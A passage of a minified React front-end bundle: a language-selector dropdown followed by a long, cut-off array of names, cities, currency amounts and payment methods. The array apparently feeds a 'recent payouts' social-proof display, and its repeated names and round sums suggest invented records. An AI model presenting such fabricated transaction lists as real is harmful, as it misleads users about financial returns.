    nativeName: "中文"
}, {
    code: "es",
    name: "Spanish",
    nativeName: "Español"
}, {
    code: "fr",
    name: "French",
    nativeName: "Français"
}]
  , zf = ({darkMode: e, themeClasses: t}) => {
    const {i18n: n} = qo()
      , [r,s] = E.useState(!1)
      , i = dn.find(l => l.code === n.language) || dn[0]
      , o = l => {
        n.changeLanguage(l),
        s(!1)
    }
    ;
    return a.jsxs("div", {
        className: "relative",
        children: [a.jsxs("button", {
            onClick: () => s(!r),
            className: `flex items-center space-x-1 sm:space-x-2 px-2 sm:px-3 py-1.5 sm:py-2 rounded-lg sm:rounded-xl ${t.hover} transition-all duration-200 border ${t.border} ${t.cardBg} shadow-sm hover:shadow-md`,
            children: [a.jsx(Me, {
                className: `w-3 h-3 sm:w-4 sm:h-4 ${t.text}`
            }), a.jsx("span", {
                className: "text-sm sm:text-lg",
                children: i.flag
            }), a.jsx("span", {
                className: `text-sm font-medium ${t.text} hidden sm:block`,
                children: i.nativeName
            }), a.jsx(Ho, {
                className: `w-3 h-3 sm:w-4 sm:h-4 ${t.textSecondary} transition-transform duration-200 ${r ? "rotate-180" : ""}`
            })]
        }), r && a.jsxs(a.Fragment, {
            children: [a.jsx("div", {
                className: "fixed inset-0 z-40",
                onClick: () => s(!1)
            }), a.jsxs("div", {
                className: `absolute right-0 top-full mt-2 w-64 sm:w-72 ${t.cardBg} rounded-xl sm:rounded-2xl border ${t.border} shadow-2xl z-50 overflow-hidden backdrop-blur-xl max-h-80 sm:max-h-96 overflow-y-auto`,
                children: [a.jsx("div", {
                    className: `p-3 border-b ${t.border} bg-gradient-to-r ${e ? "from-blue-900/20 to-purple-900/20" : "from-blue-50 to-purple-50"}`,
                    children: a.jsxs("div", {
                        className: "flex items-center space-x-2",
                        children: [a.jsx(Me, {
                            className: "w-3 h-3 sm:w-4 sm:h-4 text-blue-600"
                        }), a.jsx("span", {
                            className: `text-sm font-semibold ${t.text}`,
                            children: "Select Language"
                        })]
                    })
                }), a.jsx("div", {
                    className: "py-2",
                    children: dn.slice(0, 10).map(l => a.jsxs("button", {
                        onClick: () => o(l.code),
                        className: `w-full flex items-center justify-between px-3 sm:px-4 py-2 sm:py-3 ${t.hover} transition-all duration-200 group`,
                        children: [a.jsxs("div", {
                            className: "flex items-center space-x-2 sm:space-x-3",
                            children: [a.jsx("span", {
                                className: "text-lg sm:text-xl group-hover:scale-110 transition-transform duration-200",
                                children: l.flag
                            }), a.jsxs("div", {
                                className: "text-left",
                                children: [a.jsx("div", {
                                    className: `text-xs sm:text-sm font-medium ${t.text}`,
                                    children: l.nativeName
                                }), a.jsx("div", {
                                    className: `text-xs ${t.textSecondary}`,
                                    children: l.name
                                })]
                            })]
                        }), i.code === l.code && a.jsxs("div", {
                            className: "flex items-center space-x-2",
                            children: [a.jsx("div", {
                                className: "w-2 h-2 bg-green-500 rounded-full animate-pulse"
                            }), a.jsx(vc, {
                                className: "w-3 h-3 sm:w-4 sm:h-4 text-green-600"
                            })]
                        })]
                    }, l.code))
                }), dn.length > 10 && a.jsx("div", {
                    className: "py-2 border-t border-gray-200 dark:border-gray-700",
                    children: dn.slice(10).map(l => a.jsxs("button", {
                        onClick: () => o(l.code),
                        className: `w-full flex items-center justify-between px-4 py-3 ${t.hover} transition-all duration-200 group`,
                        children: [a.jsxs("div", {
                            className: "flex items-center space-x-3",
                            children: [a.jsx("span", {
                                className: "text-xl group-hover:scale-110 transition-transform duration-200",
                                children: l.flag
                            }), a.jsxs("div", {
                                className: "text-left",
                                children: [a.jsx("div", {
                                    className: `text-sm font-medium ${t.text}`,
                                    children: l.nativeName
                                }), a.jsx("div", {
                                    className: `text-xs ${t.textSecondary}`,
                                    children: l.name
                                })]
                            })]
                        }), i.code === l.code && a.jsxs("div", {
                            className: "flex items-center space-x-2",
                            children: [a.jsx("div", {
                                className: "w-2 h-2 bg-green-500 rounded-full animate-pulse"
                            }), a.jsx(vc, {
                                className: "w-4 h-4 text-green-600"
                            })]
                        })]
                    }, l.code))
                }), a.jsx("div", {
                    className: `p-3 border-t ${t.border} bg-gradient-to-r ${e ? "from-gray-800/50 to-gray-700/50" : "from-gray-50 to-gray-100"}`,
                    children: a.jsxs("div", {
                        className: `text-xs ${t.textSecondary} text-center`,
                        children: ["Language preference is saved automatically • ", dn.length, " languages available"]
                    })
                })]
            })]
        })]
    })
}
  , or = [{
    name: "Priya Kapoor",
    location: "Mumbai, India",
    amount: "₹85,075 INR",
    method: "UPI (India)"
}, {
    name: "James Taylor",
    location: "Sydney, Australia",
    amount: "A$5,200 AUD",
    method: "Bank Transfer"
}, {
    name: "Anna Lindberg",
    location: "Stockholm, Sweden",
    amount: "kr29,500 SEK",
    method: "Bank Transfer"
}, {
    name: "Maria Garcia",
    location: "Madrid, Spain",
    amount: "€3,250 EUR",
    method: "SEPA"
}, {
    name: "Alex Robinson",
    location: "Toronto, Canada",
    amount: "C$7,870 CAD",
    method: "PayPal"
}, {
    name: "David Lee",
    location: "London, UK",
    amount: "£22,150 GBP",
    method: "Bank Transfer"
}, {
    name: "Nguyen Tran",
    location: "Ho Chi Minh City, Vietnam",
    amount: "₫30,000,000 VND",
    method: "Bank Transfer"
}, {
    name: "Olga Sobieski",
    location: "Warsaw, Poland",
    amount: "zł2,160 PLN",
    method: "BLIK"
}, {
    name: "Chloe Tremblay",
    location: "Montreal, Canada",
    amount: "C$1,870 CAD",
    method: "PayPal"
}, {
    name: "Chen Wang",
    location: "Singapore",
    amount: "S$13,350 SGD",
    method: "Bank Transfer"
}, {
    name: "Ahmed Khan",
    location: "Dubai, UAE",
    amount: "د.إ18,300 AED",
    method: "Bank Transfer"
}, {
    name: "Fatima Ali",
    location: "Casablanca, Morocco",
    amount: "د.م.13,800 MAD",
    method: "Bank Transfer"
}, {
    name: "Raj Patel",
    location: "Delhi, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Samuel Kim",
    location: "Seoul, South Korea",
    amount: "₩2,300,000 KRW",
    method: "Bank Transfer"
}, {
    name: "Sven Johansson",
    location: "Gothenburg, Sweden",
    amount: "kr14,750 SEK",
    method: "Swish"
}, {
    name: "Emily Smith",
    location: "New York, USA",
    amount: "$9,480 USD",
    method: "PayPal"
}, {
    name: "Luisa Gallo",
    location: "Rome, Italy",
    amount: "€7,000 EUR",
    method: "SEPA"
}, {
    name: "Chris van Dijk",
    location: "Amsterdam, Netherlands",
    amount: "€2,800 EUR",
    method: "iDEAL"
}, {
    name: "Jack Wilson",
    location: "Manchester, UK",
    amount: "£5,110 GBP",
    method: "Bank Transfer"
}, {
    name: "Elena Petrova",
    location: "Moscow, Russia",
    amount: "₽88,500 RUB",
    method: "Bank Transfer"
}, {
    name: "Santiago Perez",
    location: "Lima, Peru",
    amount: "S/3,500 PEN",
    method: "Bank Transfer"
}, {
    name: "Amira Saad",
    location: "Cairo, Egypt",
    amount: "£E12,900 EGP",
    method: "Bank Transfer"
}, {
    name: "Isabella Conti",
    location: "Milan, Italy",
    amount: "€3,900 EUR",
    method: "SEPA"
}, {
    name: "Niko Salo",
    location: "Helsinki, Finland",
    amount: "€1,750 EUR",
    method: "Bank Transfer"
}, {
    name: "Sara Lee",
    location: "San Francisco, USA",
    amount: "$6,220 USD",
    method: "ACH"
}, {
    name: "Oluwaseun Adeyemi",
    location: "Lagos, Nigeria",
    amount: "₦1,850,000 NGN",
    method: "Bank Transfer"
}, {
    name: "Jean-Pierre Martin",
    location: "Paris, France",
    amount: "€2,100 EUR",
    method: "SEPA"
}, {
    name: "Olivia Brown",
    location: "Auckland, New Zealand",
    amount: "NZ$8,500 NZD",
    method: "Bank Transfer"
}, {
    name: "Aisha Rahman",
    location: "Dhaka, Bangladesh",
    amount: "৳1,50,000 BDT",
    method: "Bank Transfer"
}, {
    name: "Samantha King",
    location: "Cape Town, South Africa",
    amount: "R18,750 ZAR",
    method: "Bank Transfer"
}, {
    name: "Anya Volkov",
    location: "Saint Petersburg, Russia",
    amount: "₽1,20,000 RUB",
    method: "Bank Transfer"
}, {
    name: "Mohammed Al Farsi",
    location: "Muscat, Oman",
    amount: "ر.ع.2,900 OMR",
    method: "Bank Transfer"
}, {
    name: "Lucas Silva",
    location: "São Paulo, Brazil",
    amount: "R$15,200 BRL",
    method: "Pix"
}, {
    name: "Khalid Mansour",
    location: "Riyadh, Saudi Arabia",
    amount: "﷼7,600 SAR",
    method: "SARIE"
}, {
    name: "Jin Soo Park",
    location: "Busan, South Korea",
    amount: "₩1,750,000 KRW",
    method: "Bank Transfer"
}, {
    name: "Irina Popescu",
    location: "Bucharest, Romania",
    amount: "lei 8,200 RON",
    method: "Bank Transfer"
}, {
    name: "Ahmed El Gohary",
    location: "Alexandria, Egypt",
    amount: "£E7,300 EGP",
    method: "Bank Transfer"
}, {
    name: "Karan Joshi",
    location: "Bangalore, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Jessica Wilson",
    location: "Vancouver, Canada",
    amount: "C$3,100 CAD",
    method: "PayPal"
}, {
    name: "Pierre Dubois",
    location: "Lyon, France",
    amount: "€3,350 EUR",
    method: "SEPA"
}, {
    name: "Zara Isik",
    location: "Istanbul, Turkey",
    amount: "₺9,100 TRY",
    method: "Bank Transfer"
}, {
    name: "Thomas Meyer",
    location: "Zurich, Switzerland",
    amount: "Fr.12,500 CHF",
    method: "Bank Transfer"
}, {
    name: "Bruno Costa",
    location: "Lisbon, Portugal",
    amount: "€5,750 EUR",
    method: "MB WAY"
}, {
    name: "Nina Romanov",
    location: "Moscow, Russia",
    amount: "₽45,000 RUB",
    method: "Bank Transfer"
}, {
    name: "Lisa Müller",
    location: "Berlin, Germany",
    amount: "€2,120 EUR",
    method: "SEPA"
}, {
    name: "Samuel Mensah",
    location: "Accra, Ghana",
    amount: "₵12,000 GHS",
    method: "Bank Transfer"
}, {
    name: "Siti Aisyah",
    location: "Kuala Lumpur, Malaysia",
    amount: "RM8,700 MYR",
    method: "Bank Transfer"
}, {
    name: "Enrique Morales",
    location: "Mexico City, Mexico",
    amount: "$22,000 MXN",
    method: "SPEI"
}, {
    name: "Carmen Diaz",
    location: "Barcelona, Spain",
    amount: "€3,700 EUR",
    method: "SEPA"
}, {
    name: "Kofi Boateng",
    location: "Kigali, Rwanda",
    amount: "FRw1,800,000 RWF",
    method: "Bank Transfer"
}, {
    name: "Riya Verma",
    location: "Ahmedabad, India",
    amount: "₹46,480 INR",
    method: "UPI (India)"
}, {
    name: "Antonio Russo",
    location: "Naples, Italy",
    amount: "€1,900 EUR",
    method: "SEPA"
}, {
    name: "Peter Jensen",
    location: "Copenhagen, Denmark",
    amount: "kr14,100 DKK",
    method: "MobilePay"
}, {
    name: "Hiroshi Nakamura",
    location: "Tokyo, Japan",
    amount: "¥980,000 JPY",
    method: "Bank Transfer"
}, {
    name: "Sofia Martin",
    location: "Buenos Aires, Argentina",
    amount: "$230,000 ARS",
    method: "Bank Transfer"
}, {
    name: "Emily Johnson",
    location: "Dublin, Ireland",
    amount: "€5,900 EUR",
    method: "SEPA"
}, {
    name: "Fiona O'Brien",
    location: "Belfast, UK",
    amount: "£6,800 GBP",
    method: "Bank Transfer"
}, {
    name: "Aarav Sinha",
    location: "Lucknow, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Sara Svensson",
    location: "Uppsala, Sweden",
    amount: "kr7,300 SEK",
    method: "Swish"
}, {
    name: "Noah Smith",
    location: "Los Angeles, USA",
    amount: "$19,800 USD",
    method: "ACH"
}, {
    name: "Amina Diallo",
    location: "Bamako, Mali",
    amount: "CFA 1,200,000 XOF",
    method: "Bank Transfer"
}, {
    name: "Meera Desai",
    location: "Pune, India",
    amount: "₹68,060 INR",
    method: "UPI (India)"
}, {
    name: "Lucas Oliveira",
    location: "Rio de Janeiro, Brazil",
    amount: "R$9,500 BRL",
    method: "Pix"
}, {
    name: "Catherine Lee",
    location: "Hong Kong",
    amount: "HK$41,000 HKD",
    method: "FPS"
}, {
    name: "Gabriel Santos",
    location: "Brasilia, Brazil",
    amount: "R$18,000 BRL",
    method: "Pix"
}, {
    name: "Mikhail Ivanov",
    location: "Minsk, Belarus",
    amount: "Br 5,000 BYN",
    method: "Bank Transfer"
}, {
    name: "Yousef Hassan",
    location: "Doha, Qatar",
    amount: "ر.ق14,400 QAR",
    method: "Bank Transfer"
}, {
    name: "Nikhil Reddy",
    location: "Chennai, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Kim Min-Jae",
    location: "Seoul, South Korea",
    amount: "₩950,000 KRW",
    method: "Bank Transfer"
}, {
    name: "Jasmine Turner",
    location: "Toronto, Canada",
    amount: "C$4,500 CAD",
    method: "PayPal"
}, {
    name: "Jean Dupont",
    location: "Brussels, Belgium",
    amount: "€3,400 EUR",
    method: "SEPA"
}, {
    name: "Marta Nowak",
    location: "Gdansk, Poland",
    amount: "zł5,000 PLN",
    method: "BLIK"
}, {
    name: "Vikram Sharma",
    location: "Hyderabad, India",
    amount: "₹99,800 INR",
    method: "UPI (India)"
}, {
    name: "Julia Fischer",
    location: "Vienna, Austria",
    amount: "€8,150 EUR",
    method: "SEPA"
}, {
    name: "Fatou N'Diaye",
    location: "Dakar, Senegal",
    amount: "CFA 850,000 XOF",
    method: "Bank Transfer"
}, {
    name: "William Baker",
    location: "Auckland, New Zealand",
    amount: "NZ$3,300 NZD",
    method: "Bank Transfer"
}, {
    name: "Juan Carlos",
    location: "Lima, Peru",
    amount: "S/8,600 PEN",
    method: "Bank Transfer"
}, {
    name: "Samira Benali",
    location: "Rabat, Morocco",
    amount: "د.م.21,000 MAD",
    method: "Bank Transfer"
}, {
    name: "Victor Huang",
    location: "Taipei, Taiwan",
    amount: "NT$28,000 TWD",
    method: "Bank Transfer"
}, {
    name: "Khaled Nasser",
    location: "Kuwait City, Kuwait",
    amount: "د.ك1,450 KWD",
    method: "Bank Transfer"
}, {
    name: "Tomáš Novák",
    location: "Prague, Czechia",
    amount: "Kč24,000 CZK",
    method: "Bank Transfer"
}, {
    name: "Isabella Costa",
    location: "Sao Paulo, Brazil",
    amount: "R$13,300 BRL",
    method: "Pix"
}, {
    name: "Kevin Müller",
    location: "Bern, Switzerland",
    amount: "Fr.8,400 CHF",
    method: "Bank Transfer"
}, {
    name: "Leah Goldstein",
    location: "Tel Aviv, Israel",
    amount: "₪18,200 ILS",
    method: "Bank Transfer"
}, {
    name: "Thabo Mokoena",
    location: "Johannesburg, South Africa",
    amount: "R12,500 ZAR",
    method: "Bank Transfer"
}, {
    name: "Simon Lee",
    location: "Singapore",
    amount: "S$9,700 SGD",
    method: "Bank Transfer"
}, {
    name: "Tanya Roy",
    location: "Jaipur, India",
    amount: "₹85,000 INR",
    method: "UPI (India)"
}, {
    name: "Felipe Souza",
    location: "Salvador, Brazil",
    amount: "R$4,600 BRL",
    method: "Pix"
}, {
    name: "Elizabeth Jones",
    location: "Boston, USA",
    amount: "$7,900 USD",
    method: "ACH"
}, {
    name: "Rohit Gupta",
    location: "Indore, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Alicia Gomez",
    location: "Mexico City, Mexico",
    amount: "$15,400 MXN",
    method: "SPEI"
}, {
    name: "Anders Berg",
    location: "Stockholm, Sweden",
    amount: "kr10,900 SEK",
    method: "Bank Transfer"
}, {
    name: "Omar Farouk",
    location: "Cairo, Egypt",
    amount: "£E11,200 EGP",
    method: "Bank Transfer"
}, {
    name: "Luciana Alvarez",
    location: "Buenos Aires, Argentina",
    amount: "$325,000 ARS",
    method: "Bank Transfer"
}, {
    name: "Muhammad Yusuf",
    location: "Jakarta, Indonesia",
    amount: "Rp24,500,000 IDR",
    method: "Bank Transfer"
}, {
    name: "Kaito Suzuki",
    location: "Osaka, Japan",
    amount: "¥750,000 JPY",
    method: "Bank Transfer"
}, {
    name: "Nora Schmidt",
    location: "Munich, Germany",
    amount: "€2,900 EUR",
    method: "SEPA"
}, {
    name: "Farida Hassan",
    location: "Abu Dhabi, UAE",
    amount: "د.إ11,500 AED",
    method: "Bank Transfer"
}, {
    name: "Mehmet Demir",
    location: "Istanbul, Turkey",
    amount: "₺13,200 TRY",
    method: "Bank Transfer"
}, {
    name: "Linda Berg",
    location: "Oslo, Norway",
    amount: "kr18,300 NOK",
    method: "Bank Transfer"
}, {
    name: "Tinashe Chirwa",
    location: "Harare, Zimbabwe",
    amount: "$3,200 USD",
    method: "Bank Transfer"
}, {
    name: "Mia Nguyen",
    location: "Hanoi, Vietnam",
    amount: "₫22,800,000 VND",
    method: "Bank Transfer"
}, {
    name: "Felix Weber",
    location: "Zurich, Switzerland",
    amount: "Fr.15,700 CHF",
    method: "Bank Transfer"
}, {
    name: "Manuel Sousa",
    location: "Porto, Portugal",
    amount: "€2,400 EUR",
    method: "MB WAY"
}, {
    name: "Sneha Iyer",
    location: "Nagpur, India",
    amount: "₹77,190 INR",
    method: "UPI (India)"
}, {
    name: "Stephanie Brown",
    location: "Dallas, USA",
    amount: "$8,100 USD",
    method: "ACH"
}, {
    name: "Henrik Nielsen",
    location: "Copenhagen, Denmark",
    amount: "kr12,400 DKK",
    method: "MobilePay"
}, {
    name: "Fatima Zahra",
    location: "Marrakech, Morocco",
    amount: "د.م.5,800 MAD",
    method: "Bank Transfer"
}, {
    name: "Sebastian Maier",
    location: "Vienna, Austria",
    amount: "€4,500 EUR",
    method: "SEPA"
}, {
    name: "Daniel Okafor",
    location: "Abuja, Nigeria",
    amount: "₦970,000 NGN",
    method: "Bank Transfer"
}, {
    name: "Aarav Menon",
    location: "Kolkata, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Yara Haddad",
    location: "Beirut, Lebanon",
    amount: "ل.ل.3,800,000 LBP",
    method: "Bank Transfer"
}, {
    name: "Alexei Smirnov",
    location: "Novosibirsk, Russia",
    amount: "₽56,200 RUB",
    method: "Bank Transfer"
}, {
    name: "Laura Rossi",
    location: "Florence, Italy",
    amount: "€2,500 EUR",
    method: "SEPA"
}, {
    name: "Emily O'Connor",
    location: "Galway, Ireland",
    amount: "€3,400 EUR",
    method: "SEPA"
}, {
    name: "Gustavo Lima",
    location: "Brasilia, Brazil",
    amount: "R$6,800 BRL",
    method: "Pix"
}, {
    name: "Oliver Thompson",
    location: "London, UK",
    amount: "£13,000 GBP",
    method: "Bank Transfer"
}, {
    name: "Rajesh Kumar",
    location: "Jaipur, India",
    amount: "₹93,300 INR",
    method: "UPI (India)"
}, {
    name: "Jana Novak",
    location: "Brno, Czechia",
    amount: "Kč10,800 CZK",
    method: "Bank Transfer"
}, {
    name: "Rachel Evans",
    location: "Wellington, New Zealand",
    amount: "NZ$5,800 NZD",
    method: "Bank Transfer"
}, {
    name: "Mateo Gutierrez",
    location: "Medellin, Colombia",
    amount: "$6,900,000 COP",
    method: "PSE"
}, {
    name: "Patrick Dubois",
    location: "Nice, France",
    amount: "€2,200 EUR",
    method: "SEPA"
}, {
    name: "Fiona McCarthy",
    location: "Cork, Ireland",
    amount: "€4,300 EUR",
    method: "SEPA"
}, {
    name: "Omar Hamdi",
    location: "Tunis, Tunisia",
    amount: "د.ت.4,900 TND",
    method: "Bank Transfer"
}, {
    name: "Felicity Turner",
    location: "Birmingham, UK",
    amount: "£9,800 GBP",
    method: "Bank Transfer"
}, {
    name: "Usman Bello",
    location: "Kano, Nigeria",
    amount: "₦1,100,000 NGN",
    method: "Bank Transfer"
}, {
    name: "Koen Visser",
    location: "Amsterdam, Netherlands",
    amount: "€7,200 EUR",
    method: "iDEAL"
}, {
    name: "Johan Andersson",
    location: "Malmo, Sweden",
    amount: "kr10,600 SEK",
    method: "Swish"
}, {
    name: "Gong Li",
    location: "Shanghai, China",
    amount: "¥35,000 CNY",
    method: "Bank Transfer"
}, {
    name: "David Miller",
    location: "Los Angeles, USA",
    amount: "$12,000 USD",
    method: "ACH"
}, {
    name: "Mahmoud Khaled",
    location: "Alexandria, Egypt",
    amount: "£E6,700 EGP",
    method: "Bank Transfer"
}, {
    name: "Wei Zhang",
    location: "Beijing, China",
    amount: "¥28,600 CNY",
    method: "Bank Transfer"
}, {
    name: "Mohammed Siddiq",
    location: "Karachi, Pakistan",
    amount: "₨2,10,000 PKR",
    method: "Bank Transfer"
}, {
    name: "Karim Hassan",
    location: "Casablanca, Morocco",
    amount: "د.م.8,400 MAD",
    method: "Bank Transfer"
}, {
    name: "Ivan Markovic",
    location: "Zagreb, Croatia",
    amount: "kn6,700 HRK",
    method: "Bank Transfer"
}, {
    name: "Victor Ncube",
    location: "Bulawayo, Zimbabwe",
    amount: "$2,100 USD",
    method: "Bank Transfer"
}, {
    name: "Evelyn Green",
    location: "Dublin, Ireland",
    amount: "€3,250 EUR",
    method: "SEPA"
}, {
    name: "Arwa Al Saud",
    location: "Jeddah, Saudi Arabia",
    amount: "﷼6,800 SAR",
    method: "SARIE"
}, {
    name: "Niklas Moller",
    location: "Gothenburg, Sweden",
    amount: "kr8,900 SEK",
    method: "Bank Transfer"
}, {
    name: "Olivia Thompson",
    location: "Auckland, New Zealand",
    amount: "NZ$4,900 NZD",
    method: "Bank Transfer"
}, {
    name: "Wang Wei",
    location: "Shenzhen, China",
    amount: "¥19,800 CNY",
    method: "Bank Transfer"
}, {
    name: "Ritika Shah",
    location: "Vadodara, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Matheus Silva",
    location: "Porto Alegre, Brazil",
    amount: "R$8,300 BRL",
    method: "Pix"
}, {
    name: "Hanna Larsson",
    location: "Stockholm, Sweden",
    amount: "kr11,400 SEK",
    method: "Swish"
}, {
    name: "Emmanuel Mensah",
    location: "Accra, Ghana",
    amount: "₵18,900 GHS",
    method: "Bank Transfer"
}, {
    name: "Reema Patel",
    location: "Ahmedabad, India",
    amount: "₹84,400 INR",
    method: "UPI (India)"
}, {
    name: "Emma Nilsson",
    location: "Uppsala, Sweden",
    amount: "kr7,900 SEK",
    method: "Bank Transfer"
}, {
    name: "Karolina Zielinska",
    location: "Warsaw, Poland",
    amount: "zł4,100 PLN",
    method: "BLIK"
}, {
    name: "Samuel Kim",
    location: "Busan, South Korea",
    amount: "₩1,800,000 KRW",
    method: "Bank Transfer"
}, {
    name: "Mark Evans",
    location: "Boston, USA",
    amount: "$11,600 USD",
    method: "ACH"
}, {
    name: "Ekaterina Ivanova",
    location: "Saint Petersburg, Russia",
    amount: "₽41,000 RUB",
    method: "Bank Transfer"
}, {
    name: "Ayaan Qureshi",
    location: "Hyderabad, India",
    amount: "₹71,900 INR",
    method: "UPI (India)"
}, {
    name: "Diana Kolesnikova",
    location: "Moscow, Russia",
    amount: "₽67,500 RUB",
    method: "Bank Transfer"
}, {
    name: "Joshua Brown",
    location: "Chicago, USA",
    amount: "$5,500 USD",
    method: "ACH"
}, {
    name: "Nikolai Popov",
    location: "Kazan, Russia",
    amount: "₽49,000 RUB",
    method: "Bank Transfer"
}, {
    name: "Tracy Smith",
    location: "Vancouver, Canada",
    amount: "C$6,900 CAD",
    method: "PayPal"
}, {
    name: "Ana Pereira",
    location: "Lisbon, Portugal",
    amount: "€1,800 EUR",
    method: "MB WAY"
}, {
    name: "Lars Jensen",
    location: "Copenhagen, Denmark",
    amount: "kr13,200 DKK",
    method: "MobilePay"
}, {
    name: "Rohit Sethi",
    location: "Pune, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Marta Nowak",
    location: "Gdansk, Poland",
    amount: "zł6,800 PLN",
    method: "BLIK"
}, {
    name: "Juan Perez",
    location: "Lima, Peru",
    amount: "S/12,100 PEN",
    method: "Bank Transfer"
}, {
    name: "Karim Ali",
    location: "Cairo, Egypt",
    amount: "£E10,100 EGP",
    method: "Bank Transfer"
}, {
    name: "Clara Müller",
    location: "Hamburg, Germany",
    amount: "€2,500 EUR",
    method: "SEPA"
}, {
    name: "Sneha Mehra",
    location: "Delhi, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Miguel Santos",
    location: "Sao Paulo, Brazil",
    amount: "R$12,800 BRL",
    method: "Pix"
}, {
    name: "Daniel Almeida",
    location: "Lisbon, Portugal",
    amount: "€6,100 EUR",
    method: "MB WAY"
}, {
    name: "Aline Costa",
    location: "Rio de Janeiro, Brazil",
    amount: "R$5,600 BRL",
    method: "Pix"
}, {
    name: "Julia Kowalska",
    location: "Krakow, Poland",
    amount: "zł2,900 PLN",
    method: "BLIK"
}, {
    name: "Lina Zhang",
    location: "Beijing, China",
    amount: "¥22,500 CNY",
    method: "Bank Transfer"
}, {
    name: "Rajiv Narayan",
    location: "Chennai, India",
    amount: "₹81,700 INR",
    method: "UPI (India)"
}, {
    name: "Joao Pereira",
    location: "Lisbon, Portugal",
    amount: "€9,900 EUR",
    method: "MB WAY"
}, {
    name: "Sonia Martinez",
    location: "Barcelona, Spain",
    amount: "€2,400 EUR",
    method: "SEPA"
}, {
    name: "Daniel Williams",
    location: "London, UK",
    amount: "£17,900 GBP",
    method: "Bank Transfer"
}, {
    name: "Mohammed Said",
    location: "Amman, Jordan",
    amount: "د.ا.6,000 JOD",
    method: "Bank Transfer"
}, {
    name: "Linda Olsen",
    location: "Oslo, Norway",
    amount: "kr19,600 NOK",
    method: "Bank Transfer"
}, {
    name: "Victor Chen",
    location: "Hong Kong",
    amount: "HK$58,300 HKD",
    method: "FPS"
}, {
    name: "Nandita Singh",
    location: "Lucknow, India",
    amount: "₹92,800 INR",
    method: "UPI (India)"
}, {
    name: "Paul Weber",
    location: "Vienna, Austria",
    amount: "€7,600 EUR",
    method: "SEPA"
}, {
    name: "Eva Svensson",
    location: "Malmo, Sweden",
    amount: "kr6,300 SEK",
    method: "Swish"
}, {
    name: "Joseph Mensah",
    location: "Accra, Ghana",
    amount: "₵9,700 GHS",
    method: "Bank Transfer"
}, {
    name: "Dimitris Papadopoulos",
    location: "Athens, Greece",
    amount: "€3,000 EUR",
    method: "Bank Transfer"
}, {
    name: "Manuel Ruiz",
    location: "Madrid, Spain",
    amount: "€8,800 EUR",
    method: "SEPA"
}, {
    name: "Patricia Almeida",
    location: "Porto, Portugal",
    amount: "€4,900 EUR",
    method: "MB WAY"
}, {
    name: "Aishwarya Deshmukh",
    location: "Mumbai, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Omar El-Farouk",
    location: "Cairo, Egypt",
    amount: "£E8,600 EGP",
    method: "Bank Transfer"
}, {
    name: "Amit Rathi",
    location: "Delhi, India",
    amount: "₹92,300 INR",
    method: "UPI (India)"
}, {
    name: "Sneha Sharma",
    location: "Pune, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Rohit Gupta",
    location: "Mumbai, India",
    amount: "₹99,000 INR",
    method: "UPI (India)"
}, {
    name: "Priya Verma",
    location: "Lucknow, India",
    amount: "₹85,750 INR",
    method: "UPI (India)"
}, {
    name: "Meera Iyer",
    location: "Chennai, India",
    amount: "₹54,700 INR",
    method: "UPI (India)"
}, {
    name: "Manish Patel",
    location: "Ahmedabad, India",
    amount: "₹89,100 INR",
    method: "UPI (India)"
}, {
    name: "Pooja Nair",
    location: "Thiruvananthapuram, India",
    amount: "₹78,250 INR",
    method: "UPI (India)"
}, {
    name: "Ankit Singh",
    location: "Bangalore, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Kavita Chawla",
    location: "Kolkata, India",
    amount: "₹70,500 INR",
    method: "UPI (India)"
}, {
    name: "Arvind Mehta",
    location: "Jaipur, India",
    amount: "₹58,000 INR",
    method: "UPI (India)"
}, {
    name: "Deepika Sethi",
    location: "Patna, India",
    amount: "₹33,150 INR",
    method: "UPI (India)"
}, {
    name: "Ramesh Kumar",
    location: "Kanpur, India",
    amount: "₹22,950 INR",
    method: "UPI (India)"
}, {
    name: "Jaya Rao",
    location: "Hyderabad, India",
    amount: "₹84,600 INR",
    method: "UPI (India)"
}, {
    name: "Aarav Pillai",
    location: "Chandigarh, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Nikita Jain",
    location: "Indore, India",
    amount: "₹75,700 INR",
    method: "UPI (India)"
}, {
    name: "Aakash Shah",
    location: "Vadodara, India",
    amount: "₹88,500 INR",
    method: "UPI (India)"
}, {
    name: "Bhavna Yadav",
    location: "Ranchi, India",
    amount: "₹63,900 INR",
    method: "UPI (India)"
}, {
    name: "Rohini Joshi",
    location: "Nagpur, India",
    amount: "₹39,000 INR",
    method: "UPI (India)"
}, {
    name: "Rahul Desai",
    location: "Delhi, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Vikram Aggarwal",
    location: "Mumbai, India",
    amount: "₹1,00,000 INR",
    method: "UPI (India)"
}, {
    name: "Riya Kulkarni",
    location: "Pune, India",
    amount: "₹45,120 INR",
    method: "UPI (India)"
}, {
    name: "Rajeev Saini",
    location: "Chennai, India",
    amount: "₹69,300 INR",
    method: "UPI (India)"
}, {
    name: "Divya Menon",
    location: "Bangalore, India",
    amount: "₹82,000 INR",
    method: "UPI (India)"
}, {
    name: "Aishwarya Rao",
    location: "Lucknow, India",
    amount: "₹91,000 INR",
    method: "UPI (India)"
}, {
    name: "Akash Tripathi",
    location: "Indore, India",
    amount: "₹97,500 INR",
    method: "UPI (India)"
}, {
    name: "Sanjay Singh",
    location: "Delhi, India",
    amount: "₹43,700 INR",
    method: "UPI (India)"
}, {
    name: "Tanvi Bansal",
    location: "Kanpur, India",
    amount: "₹80,200 INR",
    method: "UPI (India)"
}, {
    name: "Ashish Sharma",
    location: "Ahmedabad, India",
    amount: "₹51,600 INR",
    method: "UPI (India)"
}, {
    name: "Preeti Malhotra",
    location: "Mumbai, India",
    amount: "₹60,000 INR",
